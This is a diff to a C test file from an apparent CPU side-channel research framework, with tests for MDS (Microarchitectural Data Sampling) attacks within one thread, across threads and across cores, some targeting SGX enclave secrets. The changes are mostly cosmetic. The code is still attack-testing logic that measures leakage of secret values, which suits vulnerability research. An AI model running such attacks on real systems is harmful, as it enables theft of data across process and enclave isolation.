@@ -3,19 +3,19 @@
 #pragma region msd
 
 TestSuite(mds, .init = construct_app_environment,
-          .fini = destruct_app_environment);
+          .fini = destruct_app_environment, .disabled = true);
 
 #pragma region mds_st_nosgx
 
 int fn_mds_st_nosgx(char *extra_settings) {
-  // set cpu affinity
+  // SET CPU AFFINITY
   int core = 1;
   cpu_set_t cpuset;
   CPU_ZERO(&cpuset);
   CPU_SET((size_t)core, &cpuset);
   ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
 
-  // calculate success rate
+  // CALCULATE SUCCESS RATE
   int accum = 0;
   for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
     app_attack_spec.offset = offset;
@@ -42,10 +42,12 @@ Test(mds, mds_st_nosgx, .disabled = false) {
   app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
   assign_enclyser_buffer(&app_filling_buffer);
 
-  app_attaking_buffer.value = 0xff;  // IMPORTANT: MUST BE NON-ZERO VALUE
+  // IMPORTANT: MUST BE NON-ZERO VALUE
+  app_attaking_buffer.value = 0xff;
   app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
-  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   assign_enclyser_buffer(&app_attaking_buffer);
+  
+  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   cripple_enclyser_buffer(&app_attaking_buffer);
 
   app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
@@ -72,21 +74,18 @@ Test(mds, mds_st_nosgx, .disabled = false) {
 #pragma region mds_st_sgx
 
 int fn_mds_st_sgx(char *extra_settings) {
-  // set cpu affinity
+  // SET CPU AFFINITY
   int core = 1;
   cpu_set_t cpuset;
   CPU_ZERO(&cpuset);
   CPU_SET((size_t)core, &cpuset);
   ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
 
-  // calculate success rate
+  // CALCULATE SUCCESS RATE
   int accum = 0;
   for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
     app_attack_spec.offset = offset;
     for (int i = 0; i < REPETITION_TIME; i++) {
-      // TODO: app_filling_buffer.value -> encalve_secret_buffer.value
-      // ecall_grooming(global_eid, app_filling_sequence, &app_filling_buffer,
-      // app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
       ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer,
                      app_clearing_sequence, &app_clearing_buffer,
                      &app_faulting_buffer);
@@ -94,16 +93,6 @@ int fn_mds_st_sgx(char *extra_settings) {
       attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
       reload(&app_encoding_buffer, &app_printing_buffer);
     }
-    // TODO: app_filling_buffer.value -> encalve_secret_buffer.value
-    // if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 10
-    // || allowance--))
-    // if (!(app_printing_buffer.buffer[offset + encalve_secret_buffer.value] >=
-    //           10 ||
-    //       allowance--)) {
-    //   INFO("offset: 0x%x", offset);
-    //   print(&app_printing_buffer, 0);
-    //   return -1;
-    // }
     accum += app_printing_buffer.buffer[offset + encalve_secret_buffer.value];
     reset(&app_printing_buffer);
   }
@@ -117,18 +106,16 @@ Test(mds, mds_st_sgx, .disabled = false) {
   app_attack_spec.major = ATTACK_MAJOR_MDS;
   app_attack_spec.minor = ATTACK_MINOR_STABLE;
 
-  // TODO: app_filling_buffer -> encalve_secret_buffer
-  // app_filling_buffer.value = 0x41;
-  // app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
-  // assign_enclyser_buffer(&app_filling_buffer);
   encalve_secret_buffer.value = 0x21;
   encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
   ecall_assign_secret(global_eid, &encalve_secret_buffer);
 
-  app_attaking_buffer.value = 0xff;  // IMPORTANT: MUST BE NON-ZERO VALUE
+  // IMPORTANT: MUST BE NON-ZERO VALUE
+  app_attaking_buffer.value = 0xff;
   app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
-  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   assign_enclyser_buffer(&app_attaking_buffer);
+
+  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   cripple_enclyser_buffer(&app_attaking_buffer);
 
   app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
@@ -155,7 +142,8 @@ Test(mds, mds_st_sgx, .disabled = false) {
 #pragma region mds_ct_nosgx
 
 void *victhrd_mds_ct_nosgx(void *arg) {
-  (void)arg; /** bypass the warning about unsed parameter */
+  // BYPASS THE WARNING ABOUT UNSED PARAMETER
+  (void)arg;
 
   for (int i = 0; i < REPETITION_TIME * 100; i++) {
     fill_lfb(app_filling_sequence, &app_filling_buffer);
@@ -165,7 +153,8 @@ void *victhrd_mds_ct_nosgx(void *arg) {
 }
 
 void *attthrd_mds_ct_nosgx(void *arg) {
-  (void)arg; /** bypass the warning about unsed parameter */
+  // BYPASS THE WARNING ABOUT UNSED PARAMETER
+  (void)arg;
 
   for (int i = 0; i < REPETITION_TIME; i++) {
     flush_enclyser_buffer(&app_encoding_buffer);
@@ -177,7 +166,7 @@ void *attthrd_mds_ct_nosgx(void *arg) {
 }
 
 int fn_mds_ct_nosgx(char *extra_settings) {
-  // set cpu affinity
+  // SET CPU AFFINITY
   int victim_core = 1;
   int adversary_core = victim_core + app_sysinfo.nr_cores;
   pthread_t victim_thread, adversary_thread;
@@ -187,7 +176,7 @@ int fn_mds_ct_nosgx(char *extra_settings) {
   CPU_SET((size_t)victim_core, &victim_cpuset);
   CPU_SET((size_t)adversary_core, &adversary_cpuset);
 
-  // calculate success rate
+  // CALCULATE SUCCESS RATE
   int accum = 0;
   for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
     app_attack_spec.offset = offset;
@@ -221,10 +210,12 @@ Test(mds, mds_ct_nosgx, .disabled = false) {
   app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
   assign_enclyser_buffer(&app_filling_buffer);
 
-  app_attaking_buffer.value = 0xff;  // IMPORTANT: MUST BE NON-ZERO VALUE
+  // IMPORTANT: MUST BE NON-ZERO VALUE
+  app_attaking_buffer.value = 0xff;
   app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
-  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   assign_enclyser_buffer(&app_attaking_buffer);
+  
+  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   cripple_enclyser_buffer(&app_attaking_buffer);
 
   app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
@@ -251,7 +242,8 @@ Test(mds, mds_ct_nosgx, .disabled = false) {
 #pragma region mds_ct_sgx
 
 void *victhrd_mds_ct_sgx(void *arg) {
-  (void)arg; /** bypass the warning about unsed parameter */
+  // BYPASS THE WARNING ABOUT UNSED PARAMETER
+  (void)arg;
 
   for (int i = 0; i < REPETITION_TIME * 100; i++) {
     ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer,
@@ -263,7 +255,8 @@ void *victhrd_mds_ct_sgx(void *arg) {
 }
 
 void *attthrd_mds_ct_sgx(void *arg) {
-  (void)arg; /** bypass the warning about unsed parameter */
+  // BYPASS THE WARNING ABOUT UNSED PARAMETER
+  (void)arg;
 
   for (int i = 0; i < REPETITION_TIME; i++) {
     flush_enclyser_buffer(&app_encoding_buffer);
@@ -275,7 +268,7 @@ void *attthrd_mds_ct_sgx(void *arg) {
 }
 
 int fn_mds_ct_sgx(char *extra_settings) {
-  // set cpu affinity
+  // SET CPU AFFINITY
   int victim_core = 1;
   int adversary_core = victim_core + app_sysinfo.nr_cores;
   pthread_t victim_thread, adversary_thread;
@@ -285,7 +278,7 @@ int fn_mds_ct_sgx(char *extra_settings) {
   CPU_SET((size_t)victim_core, &victim_cpuset);
   CPU_SET((size_t)adversary_core, &adversary_cpuset);
 
-  // calculate success rate
+  // CALCULATE SUCCESS RATE
   int accum = 0;
   for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
     app_attack_spec.offset = offset;
@@ -318,10 +311,12 @@ Test(mds, mds_ct_sgx, .disabled = false) {
   encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
   ecall_assign_secret(global_eid, &encalve_secret_buffer);
 
-  app_attaking_buffer.value = 0xff;  // IMPORTANT: MUST BE NON-ZERO VALUE
+  // IMPORTANT: MUST BE NON-ZERO VALUE
+  app_attaking_buffer.value = 0xff;
   app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
-  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   assign_enclyser_buffer(&app_attaking_buffer);
+
+  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   cripple_enclyser_buffer(&app_attaking_buffer);
 
   app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
@@ -348,7 +343,8 @@ Test(mds, mds_ct_sgx, .disabled = false) {
 #pragma region mds_cc_nosgx
 
 void *victhrd_mds_cc_nosgx(void *arg) {
-  (void)arg; /** bypass the warning about unsed parameter */
+  // BYPASS THE WARNING ABOUT UNSED PARAMETER
+  (void)arg;
 
   for (int i = 0; i < REPETITION_TIME * 100; i++) {
     fill_lfb(app_filling_sequence, &app_filling_buffer);
@@ -358,7 +354,8 @@ void *victhrd_mds_cc_nosgx(void *arg) {
 }
 
 void *attthrd_mds_cc_nosgx(void *arg) {
-  (void)arg; /** bypass the warning about unsed parameter */
+  // BYPASS THE WARNING ABOUT UNSED PARAMETER
+  (void)arg;
 
   for (int i = 0; i < REPETITION_TIME; i++) {
     flush_enclyser_buffer(&app_encoding_buffer);
@@ -370,7 +367,7 @@ void *attthrd_mds_cc_nosgx(void *arg) {
 }
 
 int fn_mds_cc_nosgx(char *extra_settings) {
-  // set cpu affinity
+  // SET CPU AFFINITY
   int victim_core = 1;
   int adversary_core = victim_core + app_sysinfo.nr_cores - 1;
   pthread_t victim_thread, adversary_thread;
@@ -380,7 +377,7 @@ int fn_mds_cc_nosgx(char *extra_settings) {
   CPU_SET((size_t)victim_core, &victim_cpuset);
   CPU_SET((size_t)adversary_core, &adversary_cpuset);
 
-  // calculate success rate
+  // CALCULATE SUCCESS RATE
   int accum = 0;
   for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
     app_attack_spec.offset = offset;
@@ -414,10 +411,12 @@ Test(mds, mds_cc_nosgx, .disabled = false) {
   app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
   assign_enclyser_buffer(&app_filling_buffer);
 
-  app_attaking_buffer.value = 0xff;  // IMPORTANT: MUST BE NON-ZERO VALUE
+  // IMPORTANT: MUST BE NON-ZERO VALUE
+  app_attaking_buffer.value = 0xff;
   app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
-  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   assign_enclyser_buffer(&app_attaking_buffer);
+
+  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   cripple_enclyser_buffer(&app_attaking_buffer);
 
   app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
@@ -444,7 +443,8 @@ Test(mds, mds_cc_nosgx, .disabled = false) {
 #pragma region mds_cc_sgx
 
 void *victhrd_mds_cc_sgx(void *arg) {
-  (void)arg; /** bypass the warning about unsed parameter */
+  // BYPASS THE WARNING ABOUT UNSED PARAMETER
+  (void)arg;
 
   for (int i = 0; i < REPETITION_TIME * 100; i++) {
     ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer,
@@ -456,7 +456,8 @@ void *victhrd_mds_cc_sgx(void *arg) {
 }
 
 void *attthrd_mds_cc_sgx(void *arg) {
-  (void)arg; /** bypass the warning about unsed parameter */
+  // BYPASS THE WARNING ABOUT UNSED PARAMETER
+  (void)arg;
 
   for (int i = 0; i < REPETITION_TIME; i++) {
     flush_enclyser_buffer(&app_encoding_buffer);
@@ -468,7 +469,7 @@ void *attthrd_mds_cc_sgx(void *arg) {
 }
 
 int fn_mds_cc_sgx(char *extra_settings) {
-  // set cpu affinity
+  // SET CPU AFFINITY
   int victim_core = 1;
   int adversary_core = victim_core + app_sysinfo.nr_cores - 1;
   pthread_t victim_thread, adversary_thread;
@@ -478,7 +479,7 @@ int fn_mds_cc_sgx(char *extra_settings) {
   CPU_SET((size_t)victim_core, &victim_cpuset);
   CPU_SET((size_t)adversary_core, &adversary_cpuset);
 
-  // calculate success rate
+  // CALCULATE SUCCESS RATE
   int accum = 0;
   for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
     app_attack_spec.offset = offset;
@@ -511,10 +512,12 @@ Test(mds, mds_cc_sgx, .disabled = false) {
   encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
   ecall_assign_secret(global_eid, &encalve_secret_buffer);
 
-  app_attaking_buffer.value = 0xff;  // IMPORTANT: MUST BE NON-ZERO VALUE
+  // IMPORTANT: MUST BE NON-ZERO VALUE
+  app_attaking_buffer.value = 0xff;
   app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
-  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   assign_enclyser_buffer(&app_attaking_buffer);
+
+  app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
   cripple_enclyser_buffer(&app_attaking_buffer);
 
   app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
